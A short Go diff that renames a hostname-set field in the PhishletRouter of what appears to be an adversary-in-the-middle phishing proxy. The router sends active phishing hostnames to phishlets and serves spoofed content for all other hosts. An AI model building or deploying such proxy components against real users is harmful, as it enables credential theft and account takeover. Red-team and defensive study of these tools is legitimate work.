@@ -16,7 +16,7 @@ type PhishletResolver interface {
 
 // PhishletRouter routes traffic to the appropriate phishlet based on the request hostname.
 type PhishletRouter struct {
-	ActiveHostnames proxy.HostnameSet
+	ActiveHostnameSet proxy.HostnameSet
 	Resolver        PhishletResolver
 	Spoof           proxy.Spoofer
 }
@@ -25,7 +25,7 @@ func (h *PhishletRouter) Name() string { return "PhishletRouter" }
 
 func (h *PhishletRouter) Handle(ctx *aitm.ProxyContext, req *http.Request) error {
 	hostname := strings.ToLower(req.Host)
-	if !h.ActiveHostnames.Contains(hostname) {
+	if !h.ActiveHostnameSet.Contains(hostname) {
 		h.Spoof.ServeHTTP(ctx.ResponseWriter, req)
 		return proxy.ErrShortCircuit
 	}
